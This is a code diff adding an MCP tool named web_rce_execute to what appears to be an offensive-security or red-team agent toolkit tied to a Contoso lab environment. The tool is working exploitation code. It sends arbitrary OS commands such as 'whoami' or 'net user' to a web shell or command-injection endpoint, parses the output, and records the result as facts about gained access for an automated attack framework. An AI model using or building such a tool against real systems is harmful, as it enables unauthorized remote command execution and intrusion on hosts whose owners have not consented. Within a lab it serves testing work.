@@ -803,6 +803,65 @@ async def web_ssrf_probe(target_url: str) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Tool: Web RCE Execute (command injection exploitation)
+# ---------------------------------------------------------------------------
+
+@mcp.tool()
+async def web_rce_execute(url: str, cmd: str = "whoami", param: str = "cmd") -> str:
+    """Execute OS command via a web shell or command injection endpoint.
+
+    Sends a GET request to `url?<param>=<cmd>` and extracts the command
+    output from a <pre> block (compatible with the Contoso debug.aspx
+    lab page deployed by Stage2-Web.ps1 S2-K).
+
+    Args:
+        url:   Web shell URL, e.g. http://192.168.0.20/debug.aspx
+        cmd:   OS command to execute, e.g. "whoami" or "net user"
+        param: Query parameter name (default: cmd)
+
+    Returns:
+        JSON with Athena facts:
+        - access.web_shell: "RCE@<url>: <cmd_output>"
+        - access.initial:   "web_shell:<url>"
+    """
+    import urllib.request as _urlreq
+    import urllib.error as _urlerr
+    import html as _html
+
+    encoded_cmd = urllib.parse.quote(cmd)
+    target_url = f"{url}?{urllib.parse.quote(param)}={encoded_cmd}"
+
+    try:
+        req = _urlreq.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
+        with _urlreq.urlopen(req, timeout=10) as resp:
+            body = resp.read().decode("utf-8", errors="replace")
+    except _urlerr.HTTPError as exc:
+        return _make_error("HTTP_ERROR", f"HTTP {exc.code} from {target_url}")
+    except Exception as exc:
+        return _make_error("CONNECTION_ERROR", f"Failed to reach {url}: {exc}")
+
+    # Extract output from <pre>...</pre>
+    pre_match = re.search(r"<pre[^>]*>(.*?)</pre>", body, re.DOTALL | re.IGNORECASE)
+    if pre_match:
+        output = _html.unescape(pre_match.group(1)).strip()
+    else:
+        output = body[:500].strip()
+
+    if not output:
+        return _make_error("NO_OUTPUT", f"RCE endpoint {url} returned empty output")
+
+    short_out = output[:400]
+    return json.dumps({
+        "facts": [
+            {"trait": "access.web_shell", "value": f"RCE@{url}: {short_out}"},
+            {"trait": "access.initial",   "value": f"web_shell:{url}"},
+            {"trait": "service.web",      "value": url},
+        ],
+        "raw_output": output[:1000],
+    })
+
+
+# ---------------------------------------------------------------------------
 # Entrypoint
 # ---------------------------------------------------------------------------
 
